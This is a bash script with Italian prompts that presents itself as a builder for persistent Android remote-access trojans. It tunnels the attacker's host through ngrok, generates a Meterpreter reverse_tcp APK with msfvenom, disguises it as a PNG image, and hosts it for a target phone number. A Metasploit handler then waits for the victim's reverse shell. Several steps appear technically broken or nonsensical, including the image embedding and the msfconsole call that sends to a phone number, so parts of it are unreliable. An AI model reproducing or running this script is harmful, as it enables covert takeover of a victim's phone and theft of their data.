#!/bin/bash

echo "Benvenuto nel creatore di RAT Android persistenti!"
echo "Questo script ti guiderà nel processo di creazione di un RAT Android."

# Chiedi all'utente l'IP e la porta dell'attaccante
echo -n "Immetti la porta dell'attaccante: "
read attacker_port

# Scarica e installa Ngrok
echo "Scaricare e installare Ngrok..."
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
rm ngrok-stable-linux-amd64.zip

# Avvia Ngrok e ottieni l'URL pubblico
echo "Avvio di Ngrok e ottenere l'URL pubblico..."
./ngrok http 8080 > ngrok.log 2>&1 &
sleep 5
url=$(grep "https" ngrok.log)
url=${url#*//}
url=${url%%/*}
echo "URL Ngrok: https://$url"

# Genera il payload
echo "Generazione del payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$url LPORT=$attacker_port -o payload.apk

# Incorpora il payload in un'immagine
echo "Incorporazione del payload in un'immagine..."
# Sostituisci image.png con un file immagine a tua scelta
convert image.png -resize 10x10! -fill "data:image/png;base64,$(base64 payload.apk)" -draw "rotate 0 color 0,0 floodfill 0,0" output.png

# Crea il server web Flask
echo "Creazione del server web Flask..."
pip install flask
python3 -m flask run --port=8080 --host=0.0.0.0 &
sleep 2

# Avvia il server web Flask con il payload e l'immagine
echo "Ospitare il payload e l'immagine sul server web Flask..."
python3 -m http.server 8000 &
sleep 2

# Ottieni l'URL dell'immagine
echo "Ottenere l'URL dell'immagine..."
image_url="https://$url:8000/output.png"
echo "URL dell'immagine: $image_url"

# Invia l'URL dell'immagine al bersaglio
echo "Invio dell'URL dell'immagine al bersaglio..."
# Sostituisci <target_number> con il numero di telefono del bersaglio (con il codice paese)
msfconsole -q -R <target_number> -x "resource exploit.rc"

# Attendi che il bersaglio installi l'immagine
echo "Attendere che il bersaglio installi l'immagine..."
read -p "Premere un tasto qualsiasi per continuare..."

# Avvia il gestore del payload
echo "Avvio del gestore del payload..."
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $url; set LPORT $attacker_port; exploit -j"

echo "Payload consegnato! Attendere che il bersaglio si connetta..."
